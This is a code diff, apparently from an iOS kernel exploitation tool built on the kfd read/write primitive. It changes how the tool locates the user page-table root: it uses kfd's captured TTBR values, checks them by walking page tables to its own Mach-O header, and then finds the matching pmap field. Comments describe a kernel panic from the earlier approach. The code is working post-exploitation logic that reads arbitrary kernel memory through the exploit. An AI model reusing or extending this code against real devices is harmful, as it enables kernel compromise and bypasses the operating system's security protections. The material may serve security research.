@@ -278,55 +278,67 @@ static NSString *run_locked(NSMutableDictionary *json)
         pmap_ok ? "OK == current_pmap" : "MISMATCH"];
 
     /*
-     * 5) Find the root table by self-verification instead of trusting one offset.
+     * 5) Trusted root table, then verify by walking to our own Mach-O header.
      *
-     *    kfdmemdump reads the root table as kread64(pmap) (offset 0), but its
-     *    README admits the M2 pmap layout was never validated. On this device
-     *    (M5.103: tt = 0xfffffdf1e3e54000) reading tt+8 fails, so offset 0 is
-     *    not the user TTBR0 root here.
+     *    M5.104 panicked here: it treated every 8-byte field of pmap as a page
+     *    table root and read at those addresses, which is "read an unknown
+     *    kernel address" -- copy_validate then took the device down
+     *    (panic-full-2026-10-24-235009: kaddr 0x16d882c68 is a user address).
      *
-     *    Instead: walk every 8-byte field of pmap (0..0x400), accept the first
-     *    value that lets us read our own Mach-O header through the page tables.
-     *    Two interpretations are tried per field: raw kernel VA, and physical
-     *    address mapped through the physmap.
+     *    Now the root comes from kfd itself: perf_run() stores TTBR0/TTBR1 as
+     *    (pa, va) in kfd->perf.ttbr[]. That value is trustworthy, so a failed
+     *    walk means our walk code is wrong -- not that we guessed a bad root.
+     *    Only after the walk succeeds do we locate the pmap field that holds
+     *    this root, by comparing values, never by reading at candidates.
      */
+    uint64_t t0_pa = 0, t0_va = 0, t1_pa = 0, t1_va = 0;
+    if (mf_ttbr_snapshot(&t0_pa, &t0_va, &t1_pa, &t1_va) != 0) {
+        return [log stringByAppendingString:@"FAIL: no ttbr snapshot"];
+    }
+    [log appendFormat:@"ttbr0 pa=%#llx va=%#llx | ttbr1 pa=%#llx va=%#llx\n",
+        (unsigned long long)t0_pa, (unsigned long long)t0_va,
+        (unsigned long long)t1_pa, (unsigned long long)t1_va];
+
     const uint64_t self_macho = (uint64_t)(uintptr_t)_dyld_get_image_header(0);
-    uint64_t root_off = 0, tt = 0;
-    int tt_mode = -1;              /* 0 = value is a kernel VA, 1 = PA via physmap */
-    int tried = 0;
+    uint64_t tt = 0;
+    int tt_mode = -1;              /* 0 = TTBR0 va, 1 = TTBR0 pa -> physmap */
+    uint32_t magic = 0;
 
-    for (uint64_t off = 0; off + 8 <= 0x400 && tt == 0; off += 8) {
-        uint64_t raw = 0;
-        if (!k64(pmap + off, &raw)) continue;
+    uint64_t cand[2] = { mf_unsign(t0_va), 0 };
+    uint64_t kva = 0;
+    if (t0_pa && pa_to_kva(t0_pa & MF_PA_MASK, &kva)) cand[1] = kva;
 
-        uint64_t cand[2] = { mf_unsign(raw), 0 };
-        uint64_t pa_part = raw & MF_PA_MASK;
-        uint64_t kva = 0;
-        if (pa_part && pa_to_kva(pa_part, &kva)) cand[1] = kva;
-
-        for (int m = 0; m < 2; m++) {
-            if (cand[m] == 0 || !mf_is_kaddr(cand[m])) continue;
-            tried++;
-            uint32_t magic = 0;
-            if (kread_user(cand[m], self_macho, &magic, sizeof(magic)) &&
-                magic == 0xfeedfacfU) {
-                root_off = off;
-                tt = cand[m];
-                tt_mode = m;
-                break;
-            }
+    for (int m = 0; m < 2; m++) {
+        if (cand[m] == 0 || !mf_is_kaddr(cand[m])) continue;
+        magic = 0;
+        if (kread_user(cand[m], self_macho, &magic, sizeof(magic)) &&
+            magic == 0xfeedfacfU) {
+            tt = cand[m];
+            tt_mode = m;
+            break;
         }
     }
 
     if (tt == 0) {
-        [log appendFormat:@"self Mach-O @ %#llx -> FAILED after %d candidate walks\n",
-            (unsigned long long)self_macho, tried];
-        return [log stringByAppendingString:@"FAIL: no pmap field produced 0xfeedfacf"];
+        [log appendFormat:@"self Mach-O @ %#llx -> FAILED with trusted ttbr (va=%#llx pa=%#llx)\n",
+            (unsigned long long)self_macho, (unsigned long long)t0_va, (unsigned long long)t0_pa];
+        return [log stringByAppendingString:@"FAIL: walk failed even with kfd's own ttbr"];
     }
 
-    [log appendFormat:@"root table = pmap+%#llx -> %#llx (%s), %d candidates tried\n",
-        (unsigned long long)root_off, (unsigned long long)tt,
-        tt_mode == 0 ? "kernel VA" : "PA->physmap", tried];
+    /* Locate the pmap field that stores this root -- comparison only. */
+    uint64_t root_off = (uint64_t)-1;
+    for (uint64_t off = 0; off + 8 <= 0x400; off += 8) {
+        uint64_t v = 0;
+        if (!k64(pmap + off, &v)) continue;
+        if (mf_unsign(v) == tt || (t0_pa && (v & MF_PA_MASK) == (t0_pa & MF_PA_MASK))) {
+            root_off = off;
+            break;
+        }
+    }
+
+    [log appendFormat:@"root table = %#llx (%s), stored at pmap+%#llx\n",
+        (unsigned long long)tt, tt_mode == 0 ? "ttbr0.va" : "ttbr0.pa->physmap",
+        (unsigned long long)root_off];
     [log appendFormat:@"self Mach-O @ %#llx -> read feedfacf (walk OK)\n",
         (unsigned long long)self_macho];
 
@@ -338,6 +350,11 @@ static NSString *run_locked(NSMutableDictionary *json)
     json[@"pmap_root_off"] = @(root_off);
     json[@"pmap_root_va"] = @(tt);
     json[@"pmap_root_mode"] = @(tt_mode);
+    json[@"kaddr_denied_count"] = @(mf_kaddr_denied_count());
+    json[@"kaddr_denied_last"] = @(mf_kaddr_denied_last());
+
+    [log appendFormat:@"kaddr guard: denied=%d last=%#llx\n",
+        mf_kaddr_denied_count(), (unsigned long long)mf_kaddr_denied_last()];
 
     [log appendFormat:@"\nRESULT OK\n"
                        "  proc->proc_ro   = 0x18\n"
